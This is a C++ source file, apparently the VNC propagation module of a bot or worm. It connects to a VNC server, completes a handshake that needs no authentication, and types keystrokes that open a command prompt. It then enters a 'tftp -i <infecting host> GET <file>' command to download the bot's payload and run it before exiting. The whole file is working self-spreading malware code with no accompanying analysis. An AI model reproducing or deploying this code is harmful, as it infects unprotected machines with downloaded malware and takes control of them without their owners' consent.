#include "includes.h"
#include "functions.h"
#include "extern.h"

#ifndef NO_VNC 

#define MAX_SEND 8 
#define MAX_RECV 64 

char text_cmd[] = "%systemroot%\\system32\\cmd.exe"; 
char text_exit[] = "exit"; 
char text_tftp[1024] = {0};

void send_key(SOCKET SOCK, char *szKey, DWORD dwKeyState = 0) 
{ 
   char szVNCSendKey[] = "\x04", 
      szKeyDown[] = "\x01", 
      szKeyUp[] = "\x00", 
      szNullBytes_1[] = "\x00\x00\x00\x00", 
      szNullBytes_2[] = "\x00\x00\x00\x00\x00"; 

   //Can't use _snprintf to just send one bit of data because of null bytes 
   if (dwKeyState == 0) 
   { 
      for (int i = 0; i <= 1; i++) 
      { 
         switch (i) 
         { 
         case 0: 
            fsend(SOCK, szVNCSendKey, 1, 0); 
            fsend(SOCK, szKeyDown, 1, 0); 

            if (strlen(szKey) == 2) 
               fsend(SOCK, szNullBytes_1, 4, 0); 
            else 
               fsend(SOCK, szNullBytes_2, 5, 0); 

            fsend(SOCK, szKey, strlen(szKey), 0); 

            break; 
         case 1: 
            fsend(SOCK, szVNCSendKey, 1, 0); 
            fsend(SOCK, szKeyUp, 1, 0); 

            if (strlen(szKey) == 2) 
               fsend(SOCK, szNullBytes_1, 4, 0); 
            else 
               fsend(SOCK, szNullBytes_2, 5, 0); 
    
            fsend(SOCK, szKey, strlen(szKey), 0); 

            break; 
         } 
      } 
   } 
   else { 
      switch (dwKeyState) 
      { 
      case 1: 
         fsend(SOCK, szVNCSendKey, 1, 0); 
         fsend(SOCK, szKeyDown, 1, 0); 

         if (strlen(szKey) == 2) 
            fsend(SOCK, szNullBytes_1, 4, 0); 
         else 
            fsend(SOCK, szNullBytes_2, 5, 0); 

         fsend(SOCK, szKey, strlen(szKey), 0); 

         break; 
      case 2: 
         fsend(SOCK, szVNCSendKey, 1, 0); 
         fsend(SOCK, szKeyUp, 1, 0); 

         if (strlen(szKey) == 2) 
            fsend(SOCK, szNullBytes_1, 4, 0); 
         else 
            fsend(SOCK, szNullBytes_2, 5, 0); 
    
         fsend(SOCK, szKey, strlen(szKey), 0); 

         break; 
      } 
   } 
} 

BOOL VNC1(EXINFO exinfo) 
{ 
   struct sockaddr_in sock; 
   SOCKET sVNC; 

   char szReceiveBuffer[MAX_RECV], 
       szChar[4], 
       szVersionPacket[] = "\x52\x46\x42\x20\x30\x30\x33\x2E\x30\x30\x38\x0A", 
       szServerPacket_1[] = "\x01\x02", 
       szServerPacket_2[] = "\x00\x00\x00\x00", 
       szClientPacket_1[] = "\x01", 
       szClientPacket_2[] = "\x01", 
       szKeyWindows[] = "\xFF\xEB", 
       szKeyArrowLeft[] = "\xFF\x51", 
       szKeyEnter[] = "\xFF\x0D", 
       szKeyR[] = "\x72"; 

   int iRecvBytes = 0, iAction = 0; 
   unsigned int i = 0; 

   if ((sVNC = fsocket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) 
   { 
      fclosesocket(sVNC); 
   } 

   sock.sin_family = AF_INET; 
   sock.sin_addr.s_addr = finet_addr(exinfo.ip); 
   sock.sin_port = fhtons((unsigned short)exinfo.port); 

   if ((fconnect(sVNC, (struct sockaddr *)&sock, sizeof(sock)))) 
   { 
      fclosesocket(sVNC); 
      return FALSE; 
   } 

   while (true) 
   { 
      memset(szReceiveBuffer, 0, sizeof(szReceiveBuffer)); 
      iRecvBytes = frecv(sVNC, szReceiveBuffer, MAX_RECV, 0); 
      if (iRecvBytes <= 0 || iRecvBytes == SOCKET_ERROR) 
      { 
         break; 
      } 
      else 
      { 
         switch (iAction) 
         { 
         case 0: 
            if (!strcmp(szReceiveBuffer, szVersionPacket)) 
            { 
               fsend(sVNC, szVersionPacket, strlen(szVersionPacket), 0); 
               iAction++; 
            } 
            else 
            { 
               fclosesocket(sVNC); 
               return FALSE; 
            } 

            break; 
         case 1: 
            if (!strcmp(szReceiveBuffer, szServerPacket_1)) 
            { 
               fsend(sVNC, szClientPacket_1, strlen(szClientPacket_1), 0); 
               iAction++; 
            } 
            else 
            { 
               fclosesocket(sVNC); 
               return FALSE; 
            } 

            break; 
         case 2: 
            if (!strcmp(szReceiveBuffer, szServerPacket_2)) 
            { 
               iAction++; 
               break; 
            } 
            else 
            { 
               fclosesocket(sVNC); 
               return FALSE; 
            } 
         } 

         if (iAction == 3) { break; } 
      } 
   } 

   fsend(sVNC, szClientPacket_2, 1, 0); 

   //press WINKEY 
   send_key(sVNC, szKeyWindows, 1); 
   Sleep(1000); 

   //press and release R key 
   send_key(sVNC, szKeyR); 
   Sleep(1000); 

   //release WINKEY 
   send_key(sVNC, szKeyWindows, 2); 
   Sleep(1000); 

   //type in "cmd" 
   for (i = 0; i < strlen(text_cmd); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_cmd[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   send_key(sVNC, szKeyEnter); 
   Sleep(2000); 

   //set text_tftp line with tftp and all parameters needed 
   memset(text_tftp, 0, sizeof(text_tftp)); 
   _snprintf(text_tftp, sizeof(text_tftp) - 1, "tftp -i %s GET %s", GetIP(exinfo.sock), filename); 

   //send text_tftp line 
   for (i = 0; i < strlen(text_tftp); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_tftp[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   Sleep(1000); 
   send_key(sVNC, szKeyEnter); 

   //wait for file to download 
   Sleep(30000); 

   //type in file name 
   for (i = 0; i < strlen(filename); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", filename[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   Sleep(1000); 
  send_key(sVNC, szKeyEnter); 

   //type in "exit" 
   for (i = 0; i < strlen(text_exit); i++) 
   { 
      _snprintf(szChar, sizeof(szChar) - 1, "%c", text_exit[i]); 
      send_key(sVNC, szChar); 
      Sleep(125); 
   } 

   //press ENTER 
   for (i = 0; i <= 1; i++) 
   { 
      Sleep(600); 
      send_key(sVNC, szKeyEnter); 
   } 

   fclosesocket(sVNC); 

   return TRUE; 
} 

#endif